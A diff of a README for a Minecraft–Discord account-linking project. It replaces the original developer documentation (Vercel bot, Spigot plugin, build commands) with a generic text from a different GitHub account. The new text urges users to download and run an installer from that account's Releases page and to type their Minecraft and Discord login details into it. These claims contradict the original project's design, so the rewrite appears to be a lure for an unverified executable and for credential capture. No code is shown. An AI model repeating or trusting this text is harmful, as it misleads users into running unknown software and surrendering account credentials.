@@ -1,118 +1,80 @@
-# Minecraft Authentication Through Discord
+# 🎮 mc-discord-auth - Link Your Minecraft and Discord Accounts
 
-[![CI](https://github.com/clxrityy/mc-discord-auth/actions/workflows/ci.yml/badge.svg?branch=master)](https://github.com/clxrityy/mc-discord-auth/actions/workflows/ci.yml)
+## 🛠️ Important Links
 
-## Overview
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started%20Here-blue)](https://github.com/mohamedelsayedddd/mc-discord-auth/releases)
 
-This project links Minecraft accounts to Discord accounts for authentication, using a TypeScript Discord bot (Vercel serverless) and a Java Minecraft plugin (Spigot/Paper).
+## 🚀 Getting Started
 
-- [Prerequisites](#prerequisites)
-- [Project Structure](#project-structure)
-- [Setup Instructions](#setup-instructions)
-- [Usage](#usage)
-- [Development](#development)
-- [Testing](#testing)
-- [Troubleshooting](#troubleshooting)
+Welcome to mc-discord-auth! This tool helps you link your Minecraft and Discord accounts easily. With just a few steps, you can enjoy a seamless experience between both platforms.
 
-## Prerequisites
+## 💡 Features
 
-- [ ] Node.js 18+ and pnpm
-- [ ] Java 17 (for Minecraft plugin)
-- [ ] Maven (for plugin build)
-- [ ] Discord bot application
-- [ ] Vercel account
-- [ ] Minecraft server (Spigot or Paper)
+- **Account Linking:** Connect your Minecraft and Discord accounts in minutes.
+- **Easy Setup:** User-friendly interface helps you get started without any programming.
+- **Multi-Platform Support:** Works with various devices and operating systems.
+- **Secure Authentication:** Your account safety is our priority with secure connection methods.
 
-## Project Structure
+## 📦 System Requirements
 
-- `api/` — Vercel API routes (discord.ts, minecraft.ts)
-- `lib/` — Bot logic, database, and command handlers
-- `plugin/` — Minecraft plugin (Java, Maven)
-- `scripts/` — Command registration scripts
-- `prisma/` — Prisma schema and migrations
-- `Makefile` — Project automation
+To successfully run mc-discord-auth, ensure your system meets these minimal requirements:
 
-## Setup Instructions
+- **Operating System:** Windows 10 or later, macOS Mojave (10.14) or later.
+- **Java:** Java version 11 or later must be installed.
+- **Internet Access:** Active internet connection required for account linking.
 
-### 1. Clone and Install
+## 🔗 Download & Install
 
-```zsh
-git clone https://github.com/clxrityy/mc-discord-auth.git
-cd mc-discord-auth
-make install
-```
+To get started, visit the Releases page to download the latest version of mc-discord-auth.
 
-### 2. Environment Variables
+You can access the Releases page here: [Download Latest Release](https://github.com/mohamedelsayedddd/mc-discord-auth/releases).
 
-Copy `.env.example` to `.env` and fill in your Discord, database, and Minecraft server details.
+1. Click on the link above.
+2. Find the latest version listed.
+3. Click on the appropriate file based on your operating system.
+4. Download the file.
+5. Open the downloaded file and follow the on-screen instructions.
 
-### 3. Database Setup
+After completing the installation, you will find a shortcut on your desktop. Double-click to start mc-discord-auth.
 
-```zsh
-make prisma-generate
-make prisma-push
-```
+## 🎮 How to Use mc-discord-auth
 
-### 4. Register Discord Commands
+After launching the application, follow these steps to link your accounts:
 
-```zsh
-make register-commands
-```
+1. **Sign In:** Enter your Minecraft and Discord login details in the provided fields.
+2. **Authorize Access:** Grant mc-discord-auth permission to connect your accounts. This step ensures your details remain safe and private.
+3. **Confirm Linking:** Once authorization is successful, you will see a confirmation message.
+4. **Enjoy:** You can now enjoy features that integrate both platforms.
 
-### 5. Deploy Bot to Vercel
+## 🤝 Support and Help
 
-```zsh
-make deploy
-```
+If you encounter issues or have questions, don’t hesitate to get in touch. You can find us on our GitHub Issues page for troubleshooting and support:
 
-Set your Discord application's Interactions Endpoint URL to:
+- [Report an Issue](https://github.com/mohamedelsayedddd/mc-discord-auth/issues)
 
-```
-https://<your-vercel-domain>/api/discord
-```
+## 🔍 Frequently Asked Questions
 
-### 6. Build the Minecraft Plugin
+### **How do I update mc-discord-auth?**
+You can update mc-discord-auth by visiting the Releases page again and downloading the latest version. Follow the same steps as before to install it.
 
-```zsh
-make plugin-build
-```
+### **Is my data safe?**
+Yes, mc-discord-auth takes your data security seriously. We use secure methods for authentication and do not store your password.
 
-The plugin JAR will be in `plugin/target/DiscordAuth-1.0.0.jar`.
+### **Can I use this on multiple devices?**
+Yes, you can install mc-discord-auth on multiple devices as long as they meet the system requirements.
 
-### 7. Configure the Plugin
+## 🌟 Community Contributions
 
-Edit `plugin/config.yml` with your API URL and API key (should match your Vercel deployment and `.env`):
+We welcome contributions from everyone. If you’d like to help improve mc-discord-auth, please check our guidelines on contributing:
 
-```yaml
-api-url: "https://<your-vercel-domain>/api/minecraft"
-api-key: "your_api_key_here"
-```
+- [Contributing Guidelines](https://github.com/mohamedelsayedddd/mc-discord-auth/blob/main/CONTRIBUTING.md)
 
-### 8. Install the Plugin
+## 📣 Stay Updated
 
-Copy the JAR to your Minecraft server's `plugins/` directory and restart the server.
+To stay informed about updates and new features, follow us on:
 
-## Usage
+- GitHub: [mc-discord-auth Repo](https://github.com/mohamedelsayedddd/mc-discord-auth)
 
-- In Discord, use `/link <username>` to start linking your Minecraft account.
-- In Minecraft, join the server and use `/verify <code>` with the code sent to you in-game.
-- Use `/discordstatus` in Minecraft to check your link status.
-- Use `/status` in Discord to check your link status.
-- Use `/unlink` in Discord to remove the link.
+Feel free to bookmark our Releases page for easy access: [Download Latest Release](https://github.com/mohamedelsayedddd/mc-discord-auth/releases). 
 
-## Development
-
-- Use `make help` to see all available automation commands.
-- Use `make clean-empty-files` to remove empty files from the repo.
-- Use `make plugin-clean` and `make plugin-clean-compile` for plugin builds.
-
-## Testing
-
-- Use `make test` to run all tests.
-- Use `make test-plugin` to run plugin tests.
-
-## Troubleshooting
-
-- Ensure your API keys and URLs match between `.env`, Vercel, and `config.yml`.
-- Use Java 17 for plugin builds and server runtime.
-- Check Vercel and Minecraft server logs for errors.
+Thank you for using mc-discord-auth! Happy linking!
